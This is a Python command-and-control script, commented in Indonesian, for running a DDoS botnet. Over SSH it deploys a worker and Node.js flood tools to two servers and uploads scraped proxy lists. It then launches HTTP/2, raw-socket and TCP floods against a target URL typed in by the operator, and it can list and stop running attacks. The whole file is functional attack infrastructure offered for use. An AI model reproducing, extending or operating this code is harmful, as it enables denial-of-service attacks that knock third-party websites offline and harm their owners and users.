#!/usr/bin/env python3
import os
import sys
import json
import time
import threading
import paramiko
from datetime import datetime
import subprocess
import signal
import random

# Load konfigurasi
with open('config.json', 'r') as f:
    CONFIG = json.load(f)

SERVER1 = CONFIG['server1']
SERVER2 = CONFIG['server2']
SECURITY = CONFIG['security']
ATTACK = CONFIG['attack']

class C2Controller:
    def __init__(self):
        self.servers = {
            'server1': {'config': SERVER1, 'status': 'unknown', 'tasks': []},
            'server2': {'config': SERVER2, 'status': 'unknown', 'tasks': []}
        }
        self.active_attacks = []
        self.attack_threads = []
        self.api_key = SECURITY['api_key']
        
    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def print_banner(self):
        banner = """
    ╔═══════════════════════════════════════════════════════════════════╗
    ║     ██████╗  ██████╗ ████████╗███╗   ██╗███████╗████████╗         ║
    ║     ██╔══██╗██╔═══██╗╚══██╔══╝████╗  ██║██╔════╝╚══██╔══╝         ║
    ║     ██████╔╝██║   ██║   ██║   ██╔██╗ ██║█████╗     ██║            ║
    ║     ██╔══██╗██║   ██║   ██║   ██║╚██╗██║██╔══╝     ██║            ║
    ║     ██████╔╝╚██████╔╝   ██║   ██║ ╚████║███████╗   ██║            ║
    ║     ╚═════╝  ╚═════╝    ╚═╝   ╚═╝  ╚═══╝╚══════╝   ╚═╝            ║
    ║                    C2 ruiixh4xor                          ║
    ║                    MASTER CONTROLLER                               ║
    ╚═══════════════════════════════════════════════════════════════════╝
        """
        print(f"\033[96m{banner}\033[0m")
        print(f"\033[93m[•] Server1: {SERVER1['ip']}:{SERVER1['port']} | Max Bots: {SERVER1['max_bots']}\033[0m")
        print(f"\033[93m[•] Server2: {SERVER2['ip']}:{SERVER2['port']} | Max Bots: {SERVER2['max_bots']}\033[0m")
        print(f"\033[93m[•] Active Attacks: {len(self.active_attacks)} | API Key: {self.api_key[:10]}...\033[0m")
        print(f"\033[94m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")
    
    def print_menu(self):
        menu = """
    \033[92m[01]\033[0m attack       - Mulai serangan DDoS (Background)
    \033[92m[02]\033[0m status       - Cek status kedua server
    \033[92m[03]\033[0m deploy       - Deploy tools ke kedua server
    \033[92m[04]\033[0m sync         - Sinkronisasi konfigurasi ke server
    \033[92m[05]\033[0m proxy        - Update proxy di semua server
    \033[92m[06]\033[0m tasks        - Lihat task aktif di background
    \033[92m[07]\033[0m stop         - Hentikan serangan tertentu
    \033[92m[08]\033[0m stop_all     - Hentikan semua serangan
    \033[92m[09]\033[0m clear        - Bersihkan layar
    \033[92m[10]\033[0m exit         - Keluar dari C2
        """
        print(menu)
    
    def ssh_connect(self, server):
        """Koneksi SSH ke server"""
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(
                server['config']['ip'],
                port=server['config']['port'],
                username=server['config']['username'],
                password=server['config']['password'],
                timeout=10,
                allow_agent=False,
                look_for_keys=False
            )
            return ssh
        except Exception as e:
            print(f"\033[91m[!] SSH Error ke {server['config']['ip']}: {e}\033[0m")
            return None
    
    def check_server_status(self):
        """Cek status kedua server"""
        print("\n\033[95m[•] Checking server status...\033[0m")
        
        for server_name, server in self.servers.items():
            print(f"\n\033[96m[•] Checking {server_name} ({server['config']['ip']})...\033[0m")
            ssh = self.ssh_connect(server)
            if ssh:
                try:
                    # Cek uptime
                    stdin, stdout, stderr = ssh.exec_command("uptime")
                    uptime = stdout.read().decode().strip()
                    
                    # Cek worker python
                    stdin, stdout, stderr = ssh.exec_command("ps aux | grep worker.py | grep -v grep")
                    worker = stdout.read().decode().strip()
                    
                    # Cek proses attack Node.js
                    stdin, stdout, stderr = ssh.exec_command("ps aux | grep -E 'H2.js|RAW.js|TO.js|STORMX.js' | grep -v grep | wc -l")
                    attack_count = stdout.read().decode().strip() or "0"
                    
                    # Cek Node.js version
                    stdin, stdout, stderr = ssh.exec_command("node --version 2>/dev/null || echo 'Not installed'")
                    node_version = stdout.read().decode().strip()
                    
                    # Cek proxy file
                    stdin, stdout, stderr = ssh.exec_command("cat /root/c2/tools/proxy.txt 2>/dev/null | wc -l")
                    proxy_count = stdout.read().decode().strip() or "0"
                    
                    server['status'] = 'online' if worker else 'no_worker'
                    
                    print(f"\033[92m  ✓ Status: Online\033[0m")
                    print(f"\033[92m  ✓ Worker: {'Running' if worker else 'Stopped'}\033[0m")
                    print(f"\033[92m  ✓ Node.js: {node_version}\033[0m")
                    print(f"\033[92m  ✓ Active Attacks: {attack_count}\033[0m")
                    print(f"\033[92m  ✓ Proxies: {proxy_count.strip()}\033[0m")
                    print(f"\033[92m  ✓ Uptime: {uptime[:50]}\033[0m")
                    
                    ssh.close()
                except Exception as e:
                    server['status'] = 'error'
                    print(f"\033[91m  ✗ Error: {e}\033[0m")
            else:
                server['status'] = 'offline'
                print(f"\033[91m  ✗ Status: Offline\033[0m")
    
    def deploy_to_server(self, server_name, server):
        """Deploy tools ke server"""
        print(f"\n\033[96m[•] Deploying to {server_name} ({server['config']['ip']})...\033[0m")
        ssh = self.ssh_connect(server)
        if ssh:
            try:
                # Buat direktori
                commands = [
                    "mkdir -p /root/c2/tools",
                    "mkdir -p /root/c2/logs",
                    "apt-get update -y",
                    "apt-get install -y python3-pip nodejs npm screen",
                    "pip3 install flask requests paramiko psutil",
                    "npm install -g axios http2 net"
                ]
                
                for cmd in commands:
                    print(f"  Running: {cmd}")
                    stdin, stdout, stderr = ssh.exec_command(cmd)
                    stdout.channel.recv_exit_status()
                
                # Upload worker.py
                print("  Uploading worker.py...")
                with open('tools/worker.py', 'r') as f:
                    worker_content = f.read()
                
                sftp = ssh.open_sftp()
                with sftp.open('/root/c2/worker.py', 'w') as f:
                    f.write(worker_content)
                
                # Upload Node.js tools
                tools = ['H2.js', 'RAW.js', 'TO.js', 'STORMX.js', 'proxy.js']
                for tool in tools:
                    if os.path.exists(f'tools/{tool}'):
                        print(f"  Uploading tools/{tool}...")
                        with open(f'tools/{tool}', 'r') as f:
                            tool_content = f.read()
                        with sftp.open(f'/root/c2/tools/{tool}', 'w') as tf:
                            tf.write(tool_content)
                
                sftp.close()
                
                # Buat config.json di server
                server_config = {
                    'worker_name': server_name,
                    'worker_ip': server['config']['ip'],
                    'worker_port': 5001,
                    'master_ip': SERVER1['ip'],
                    'master_port': 5000,
                    'api_key': SECURITY['api_key'],
                    'max_bots': server['config']['max_bots']
                }
                
                print("  Creating config.json...")
                config_json = json.dumps(server_config, indent=4)
                stdin, stdout, stderr = ssh.exec_command(f"cat > /root/c2/config.json << 'EOF'\n{config_json}\nEOF")
                
                # Buat package.json untuk Node.js
                package_json = {
                    "name": "c2-attack-tools",
                    "version": "1.0.0",
                    "dependencies": {
                        "axios": "^1.6.0",
                        "http2": "^3.3.7",
                        "https": "^1.0.0",
                        "net": "^1.0.2",
                        "tls": "^1.0.1",
                        "crypto": "^1.0.1"
                    }
                }
                
                package_str = json.dumps(package_json, indent=2)
                stdin, stdout, stderr = ssh.exec_command(f"cat > /root/c2/package.json << 'EOF'\n{package_str}\nEOF")
                
                # Install Node.js dependencies
                ssh.exec_command("cd /root/c2 && npm install")
                
                # Jalankan worker
                print("  Starting worker...")
                ssh.exec_command("cd /root/c2 && screen -dmS worker python3 worker.py")
                
                print(f"\033[92m  ✓ Deployment to {server_name} complete!\033[0m")
                ssh.close()
                
            except Exception as e:
                print(f"\033[91m  ✗ Error: {e}\033[0m")
    
    def auto_deploy(self):
        """Deploy ke kedua server otomatis"""
        self.clear_screen()
        self.print_banner()
        print("\n\033[95m[•] Auto Deploy ke kedua server...\033[0m")
        print("\033[94m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")
        
        for server_name, server in self.servers.items():
            self.deploy_to_server(server_name, server)
            time.sleep(2)
        
        print("\n\033[92m[✓] Deployment selesai ke kedua server!\033[0m")
        input("\n\033[93mEnter to back menu..\033[0m")
    
    def sync_config(self):
        """Sinkronisasi konfigurasi ke semua server"""
        self.clear_screen()
        self.print_banner()
        print("\n\033[95m[•] Sinkronisasi konfigurasi ke server...\033[0m")
        
        for server_name, server in self.servers.items():
            print(f"\n\033[96m[•] Syncing to {server_name}...\033[0m")
            ssh = self.ssh_connect(server)
            if ssh:
                try:
                    # Update config di server
                    server_config = {
                        'worker_name': server_name,
                        'worker_ip': server['config']['ip'],
                        'worker_port': 5001,
                        'master_ip': SERVER1['ip'],
                        'master_port': 5000,
                        'api_key': SECURITY['api_key'],
                        'max_bots': server['config']['max_bots']
                    }
                    
                    config_json = json.dumps(server_config, indent=4)
                    stdin, stdout, stderr = ssh.exec_command(f"cat > /root/c2/config.json << 'EOF'\n{config_json}\nEOF")
                    
                    # Restart worker
                    ssh.exec_command("pkill -f worker.py")
                    time.sleep(2)
                    ssh.exec_command("cd /root/c2 && screen -dmS worker python3 worker.py")
                    
                    print(f"\033[92m  ✓ Synced and restarted\033[0m")
                    ssh.close()
                except Exception as e:
                    print(f"\033[91m  ✗ Error: {e}\033[0m")
        
        input("\n\033[93mEnter to back menu..\033[0m")
    
    def update_proxy_all(self):
        """Update proxy di semua server menggunakan proxy.js original"""
        self.clear_screen()
        self.print_banner()
        print("\n\033[95m[•] Update proxy di semua server...\033[0m")
        
        # Jalankan proxy.js lokal
        print("\n\033[96m[•] Menjalankan proxy scraper (Node.js)...\033[0m")
        
        try:
            # Pastikan kita di direktori yang benar
            os.chdir(os.path.dirname(os.path.abspath(__file__)))
            
            # Jalankan proxy.js
            result = subprocess.run(['node', 'tools/proxy.js'], 
                                  capture_output=True, text=True, cwd=os.getcwd())
            
            # Parse JSON output dari proxy.js
            try:
                # Cari baris yang mengandung JSON
                for line in result.stdout.split('\n'):
                    if line.strip().startswith('{') and line.strip().endswith('}'):
                        proxy_stats = json.loads(line)
                        print(f"\n\033[92m[✓] Proxy Stats: {proxy_stats['totalUnique']} unique from {proxy_stats['totalRaw']} raw\033[0m")
                        break
            except:
                print(result.stdout)
            
            # Cek proxy.txt di folder tools
            proxy_path = os.path.join('tools', 'proxy.txt')
            if not os.path.exists(proxy_path):
                print("\033[91m[!] Gagal mendapatkan proxy di tools/proxy.txt\033[0m")
                input("\nEnter to back menu..")
                return
            
            # Baca proxy
            with open(proxy_path, 'r') as f:
                proxy_data = f.read()
                proxy_lines = proxy_data.splitlines()
                print(f"\033[92m[✓] Total proxy di tools/proxy.txt: {len(proxy_lines)}\033[0m")
            
            # Upload ke server
            for server_name, server in self.servers.items():
                print(f"\n\033[96m[•] Uploading to {server_name}...\033[0m")
                ssh = self.ssh_connect(server)
                if ssh:
                    try:
                        sftp = ssh.open_sftp()
                        
                        # Buat folder tools jika belum ada
                        try:
                            sftp.mkdir('/root/c2/tools')
                        except:
                            pass
                        
                        # Upload ke /root/c2/tools/proxy.txt
                        remote_path = '/root/c2/tools/proxy.txt'
                        with sftp.open(remote_path, 'w') as f:
                            f.write(proxy_data)
                        
                        # Juga simpan di root untuk kompatibilitas
                        try:
                            with sftp.open('/root/c2/proxy.txt', 'w') as f:
                                f.write(proxy_data)
                        except:
                            pass
                        
                        sftp.close()
                        
                        print(f"\033[92m  ✓ Proxy uploaded to {server_name}:/root/c2/tools/proxy.txt ({len(proxy_lines)} proxies)\033[0m")
                        
                        ssh.close()
                    except Exception as e:
                        print(f"\033[91m  ✗ Error: {e}\033[0m")
            
        except Exception as e:
            print(f"\033[91m[!] Error: {e}\033[0m")
        
        input("\n\033[93mEnter to back menu..\033[0m")
    
    def start_attack_background(self, method, url, duration, threads, rate):
        """Fungsi yang berjalan di background untuk memulai serangan"""
        attack_id = f"ATTACK_{int(time.time())}"
        
        print(f"\n\033[92m[✓] Background attack {attack_id} dimulai...\033[0m")
        
        attack_info = {
            'id': attack_id,
            'method': method,
            'target': url,
            'duration': duration,
            'threads': threads,
            'rate': rate,
            'start_time': datetime.now().strftime("%H:%M:%S"),
            'servers': []
        }
        
        # Kirim perintah ke kedua server via SSH
        for server_name, server in self.servers.items():
            print(f"\n\033[96m[•] Sending to {server_name}...\033[0m")
            ssh = self.ssh_connect(server)
            if ssh:
                try:
                    # Pilih tool berdasarkan method
                    if method == "H2":
                        cmd = f"cd /root/c2 && node tools/H2.js {url} {duration} {rate} {threads} proxy.txt"
                    elif method == "RAW":
                        cmd = f"cd /root/c2 && node tools/RAW.js {url} {duration} {threads} proxy.txt"
                    elif method == "TO":
                        cmd = f"cd /root/c2 && node tools/TO.js {url} {duration} {threads} {rate} proxy.txt"
                    elif method == "STORMX":
                        cmd = f"cd /root/c2 && node tools/STORMX.js {url} {duration} {threads} {rate} proxy.txt"
                    elif method == "ALL":
                        rand_method = random.choice(['H2', 'RAW', 'TO', 'STORMX'])
                        if rand_method == "H2":
                            cmd = f"cd /root/c2 && node tools/H2.js {url} {duration} {rate} {threads} proxy.txt"
                        elif rand_method == "RAW":
                            cmd = f"cd /root/c2 && node tools/RAW.js {url} {duration} {threads} proxy.txt"
                        elif rand_method == "TO":
                            cmd = f"cd /root/c2 && node tools/TO.js {url} {duration} {threads} {rate} proxy.txt"
                        else:
                            cmd = f"cd /root/c2 && node tools/STORMX.js {url} {duration} {threads} {rate} proxy.txt"
                    
                    # Jalankan di screen
                    screen_name = f"attack_{server_name}_{int(time.time())}"
                    screen_cmd = f"cd /root/c2 && screen -dmS {screen_name} {cmd}"
                    stdin, stdout, stderr = ssh.exec_command(screen_cmd)
                    
                    attack_info['servers'].append({
                        'name': server_name,
                        'screen': screen_name,
                        'status': 'running'
                    })
                    
                    print(f"\033[92m  ✓ Attack started on {server_name}\033[0m")
                    ssh.close()
                    
                except Exception as e:
                    print(f"\033[91m  ✗ Error di {server_name}: {e}\033[0m")
        
        self.active_attacks.append(attack_info)
        
        # Auto cleanup
        def monitor_attack():
            time.sleep(int(duration))
            for attack in self.active_attacks:
                if attack['id'] == attack_id:
                    self.active_attacks.remove(attack)
                    print(f"\n\033[93m[⏱] Attack {attack_id} selesai ({duration} detik)\033[0m")
                    break
        
        monitor_thread = threading.Thread(target=monitor_attack)
        monitor_thread.daemon = True
        monitor_thread.start()
        self.attack_threads.append(monitor_thread)
    
    def start_attack(self):
        """Menu untuk memulai serangan"""
        self.clear_screen()
        self.print_banner()
        print("\033[95m[•] Background Attack Mode (Node.js Tools)\033[0m")
        print("\033[94m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")
        
        # Pilih metode
        print("\n\033[96mMetode Serangan (Node.js):\033[0m")
        print("  [1] H2      - HTTP/2 Flood")
        print("  [2] RAW     - Raw Socket Flood")
        print("  [3] TO      - TCP OAST Flood")
        print("  [4] STORMX  - Storm Multilayer")
        print("  [5] ALL     - Semua metode (Distributed)")
        
        method_choice = input("\n\033[93mPilih metode [1-5]:\033[0m ").strip()
        
        methods = {
            '1': 'H2',
            '2': 'RAW',
            '3': 'TO',
            '4': 'STORMX',
            '5': 'ALL'
        }
        
        if method_choice not in methods:
            print("\033[91m[!] Pilihan tidak valid\033[0m")
            time.sleep(1)
            return
        
        method = methods[method_choice]
        
        # Input target
        url = input("\033[93mURL Target:\033[0m ").strip()
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        
        # Input durasi
        durasi = input(f"\033[93mDurasi (detik) [default: {ATTACK['default_duration']}]:\033[0m ").strip()
        if not durasi:
            durasi = ATTACK['default_duration']
        
        # Input threads per server
        threads = input(f"\033[93mThreads per server [default: {ATTACK['default_threads']}]:\033[0m ").strip()
        if not threads:
            threads = ATTACK['default_threads']
        
        # Input rate
        rate = input("\033[93mRate (requests/second) [default: 1000]:\033[0m ").strip() or "1000"
        
        print(f"\n\033[92m[✓] Menyiapkan serangan {method} ke {url}\033[0m")
        print(f"\033[92m[✓] Durasi: {durasi} detik, Threads/server: {threads}\033[0m")
        
        # Jalankan di background
        attack_thread = threading.Thread(
            target=self.start_attack_background,
            args=(method, url, durasi, threads, rate)
        )
        attack_thread.daemon = True
        attack_thread.start()
        self.attack_threads.append(attack_thread)
        
        print("\n\033[92m[✓] Serangan sedang berjalan di BACKGROUND (Node.js)!\033[0m")
        print("\033[93m[•] Ketik 'tasks' untuk melihat status\033[0m")
        
        input("\n\033[93mTekan Enter untuk kembali ke menu...\033[0m")
    
    def show_tasks(self):
        """Tampilkan semua task yang berjalan"""
        self.clear_screen()
        self.print_banner()
        print("\n\033[95m[•] Background Tasks Status:\033[0m")
        print("\033[94m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")
        
        if not self.active_attacks:
            print("\033[93m[!] Tidak ada serangan aktif di background\033[0m")
        else:
            for i, attack in enumerate(self.active_attacks, 1):
                # Hitung sisa waktu
                start_time = datetime.strptime(attack['start_time'], "%H:%M:%S")
                now = datetime.now()
                elapsed = (now - start_time).seconds
                remaining = max(0, int(attack['duration']) - elapsed)
                
                status_color = "\033[92m" if remaining > 0 else "\033[93m"
                
                print(f"\n\033[96m[{i}] Attack ID: {attack['id']}\033[0m")
                print(f"  Method: {attack['method']} (Node.js)")
                print(f"  Target: {attack['target']}")
                print(f"  Duration: {attack['duration']} detik")
                print(f"  Start: {attack['start_time']}")
                print(f"  Remaining: {status_color}{remaining} detik\033[0m")
                print(f"  Servers: {len(attack['servers'])}")
        
        input("\n\033[93mEnter to back menu..\033[0m")
    
    def stop_attack(self):
        """Hentikan serangan tertentu"""
        self.clear_screen()
        self.print_banner()
        print("\n\033[95m[•] Stop Background Attack\033[0m")
        print("\033[94m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")
        
        if not self.active_attacks:
            print("\033[93m[!] Tidak ada serangan aktif\033[0m")
            input("\nEnter to back menu..")
            return
        
        # Tampilkan daftar attack
        for i, attack in enumerate(self.active_attacks, 1):
            print(f"\033[96m[{i}] {attack['id']} - {attack['target']} ({attack['method']})\033[0m")
        
        choice = input("\n\033[93mPilih nomor attack yang akan dihentikan [0 untuk batal]:\033[0m ").strip()
        
        if choice.isdigit() and 1 <= int(choice) <= len(self.active_attacks):
            attack = self.active_attacks[int(choice)-1]
            
            print(f"\n\033[96m[•] Menghentikan attack {attack['id']}...\033[0m")
            
            for server_info in attack['servers']:
                server_name = server_info['name']
                server = self.servers[server_name]
                
                ssh = self.ssh_connect(server)
                if ssh:
                    try:
                        # Kill screen session
                        ssh.exec_command(f"screen -S {server_info['screen']} -X quit")
                        # Kill Node.js processes
                        ssh.exec_command("pkill -f H2.js; pkill -f RAW.js; pkill -f TO.js; pkill -f STORMX.js")
                        print(f"  \033[92m✓ Stopped on {server_name}\033[0m")
                        ssh.close()
                    except:
                        print(f"  \033[91m✗ Failed on {server_name}\033[0m")
            
            self.active_attacks.remove(attack)
            print(f"\n\033[92m[✓] Attack {attack['id']} telah dihentikan\033[0m")
        else:
            print("\033[91m[!] Dibatalkan\033[0m")
        
        input("\n\033[93mEnter to back menu..\033[0m")
    
    def stop_all_attacks(self):
        """Hentikan semua serangan"""
        self.clear_screen()
        self.print_banner()
        print("\n\033[95m[•] Menghentikan SEMUA serangan...\033[0m")
        
        for server_name, server in self.servers.items():
            print(f"\n\033[96m[•] Stopping attacks on {server_name}...\033[0m")
            ssh = self.ssh_connect(server)
            if ssh:
                try:
                    # Kill semua proses Node.js attack
                    ssh.exec_command("pkill -f H2.js; pkill -f RAW.js; pkill -f TO.js; pkill -f STORMX.js")
                    ssh.exec_command("screen -ls | grep attack | cut -d. -f1 | awk '{print $1}' | xargs -r kill")
                    
                    print(f"\033[92m  ✓ Semua serangan dihentikan\033[0m")
                    ssh.close()
                except Exception as e:
                    print(f"\033[91m  ✗ Error: {e}\033[0m")
        
        self.active_attacks.clear()
        print("\n\033[92m[✓] SEMUA serangan telah dihentikan!\033[0m")
        input("\n\033[93mEnter to back menu..\033[0m")
    
    def run(self):
        """Main loop"""
        while True:
            self.clear_screen()
            self.print_banner()
            self.print_menu()
            
            choice = input("\033[93mruiix@[C2-MASTER]>\033[0m ").strip().lower()
            
            if choice in ["1", "attack"]:
                self.start_attack()
            elif choice in ["2", "status"]:
                self.check_server_status()
                input("\n\033[93mEnter to back menu..\033[0m")
            elif choice in ["3", "deploy"]:
                self.auto_deploy()
            elif choice in ["4", "sync"]:
                self.sync_config()
            elif choice in ["5", "proxy"]:
                self.update_proxy_all()
            elif choice in ["6", "tasks"]:
                self.show_tasks()
            elif choice in ["7", "stop"]:
                self.stop_attack()
            elif choice in ["8", "stop_all"]:
                self.stop_all_attacks()
            elif choice in ["9", "clear"]:
                continue
            elif choice in ["10", "exit", "quit"]:
                print("\033[91m[!] Keluar dari C2...\033[0m")
                stop = input("Hentikan semua serangan sebelum keluar? (y/n): ").strip().lower()
                if stop == 'y':
                    self.stop_all_attacks()
                sys.exit(0)
            else:
                print("\033[91m[!] Pilihan tidak valid!\033[0m")
                time.sleep(1)

if __name__ == "__main__":
    # Cek dependencies
    try:
        import paramiko
    except ImportError:
        os.system("pip3 install paramiko")
    
    controller = C2Controller()
    controller.run()